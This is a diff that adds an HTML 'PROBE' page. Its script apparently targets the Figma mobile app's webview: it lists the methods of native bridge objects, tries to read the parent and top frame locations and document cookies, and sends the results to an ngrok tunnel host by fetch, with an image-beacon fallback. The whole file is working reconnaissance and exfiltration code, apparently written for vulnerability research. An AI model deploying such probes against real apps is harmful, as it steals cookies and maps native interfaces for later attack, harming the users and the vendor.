@@ -1,0 +1,33 @@
+<!doctype html><meta charset=utf-8><title>PROBE</title>
+<body style="font:14px monospace;background:#111;color:#0f0">
+<h2 id=h>probe running…</h2><pre id=o></pre>
+<script>
+const LAB='https://20ea-2a02-2f00-2003-2400-3907-b341-dcfe-99a1.ngrok-free.app';
+const R={tag:'PROBE', href:location.href, origin:location.origin, ref:document.referrer, ua:navigator.userAgent,
+         isTop:(window===window.top), frames:window.length};
+const BRIDGES=['CommentEventBus','CommonViewerEventBus','FileViewerEventBus','MakeViewerEventBus','MirrorViewerEventBus',
+  'MobileApp','NativeLoaderEventBus','PlayableViewerEventBus','PrototypeViewerEventBus','SlideDeckViewerEventBus',
+  'SlideViewerEventBus','android_hook'];
+R.bridges={};
+for (const b of BRIDGES){
+  try{
+    const o=window[b];
+    if(o===undefined){R.bridges[b]='absent';continue;}
+    const ms=[]; for(const k in o){ try{ if(typeof o[k]==='function') ms.push(k); }catch(e){} }
+    R.bridges[b]={type:typeof o, methods:ms};
+  }catch(e){R.bridges[b]='err:'+e.message}
+}
+R.FigmaMobile = (()=>{ try{ return typeof window.FigmaMobile==='undefined'?'absent':Object.keys(window.FigmaMobile);}catch(e){return 'err'} })();
+// same-origin reach tests
+function t(name,fn){ try{ R[name]=String(fn()).slice(0,300); }catch(e){ R[name]='BLOCKED: '+e.name+': '+e.message.slice(0,120); } }
+t('top_location', ()=>window.top.location.href);
+t('parent_location', ()=>window.parent.location.href);
+t('parent_cookie', ()=>window.parent.document.cookie);
+t('own_cookie', ()=>document.cookie);
+t('opener', ()=>window.opener && window.opener.location.href);
+document.getElementById('o').textContent=JSON.stringify(R,null,1);
+document.getElementById('h').textContent='probe done';
+fetch(LAB+'/log/probe',{method:'POST',mode:'cors',body:JSON.stringify(R)}).catch(e=>{
+  new Image().src=LAB+'/log/probe-img?d='+encodeURIComponent(JSON.stringify(R).slice(0,1500));
+});
+</script></body>
